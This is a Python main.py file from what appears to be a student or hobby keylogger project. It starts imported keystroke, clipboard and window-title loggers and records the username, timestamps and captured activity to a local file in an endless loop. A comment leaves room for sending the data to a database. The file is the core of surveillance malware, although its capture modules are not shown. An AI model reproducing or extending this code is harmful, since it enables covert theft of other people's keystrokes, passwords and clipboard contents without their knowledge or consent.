########################################################################################################################
#               This is the main.py for this project where the core of the project's code should be.                   #
#               Try to keep the code as modular as possible by separating it into functions and classes.               #
#                                                                                                                      #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Library imports here
import window_info_logger as wilogger
import keystrokes_and_clipboard_logger as kclogger
import os
from datetime import datetime
import time
import getpass


def check_if_time_passed(old_time, time_passed):
    if time.time() - old_time >= time_passed:
        return True


def log_time(text_file, time_since_epoch):
    current_time = datetime.fromtimestamp(time_since_epoch)
    current_time_hour_minute_seconds = current_time.strftime('%H:%M:%S')
    text_file.write(f"\n[TIME]: {current_time_hour_minute_seconds} ")


def initialise_log_file(text_file):
    user = getpass.getuser()
    text_file.write(f"User: {user}" + "\n")
    text_file.write(f"Date & time: {datetime.now()}\n")
    text_file.write("======================================================" + "\n")


# Main code here
def main():
    if os.path.isfile("test.txt"):
        # Add code for sending data to database here.
        os.remove("test.txt")
    old_time = time.time()
    note_time_every_x_seconds = 2

    with open('test.txt', 'a+', encoding="utf-8") as f:
        initialise_log_file(f)  # Note user info and starting date + time of keylogger.
        kc_logger_object = kclogger.KeysClipboardLogger(f)  # Start keylogger.
        window_logger_object = wilogger.WindowLogger(f)  # Start window logger.
        # kc_logger_object.start_keylogger(f)  # Uncomment this if you decide to remove it from the object's __init__.
        while True:
            if check_if_time_passed(old_time, note_time_every_x_seconds):
                old_time = time.time()
                log_time(f, old_time)
            window_logger_object.log_window()
            kc_logger_object.log_clipboard()


if __name__ == '__main__':
    main()
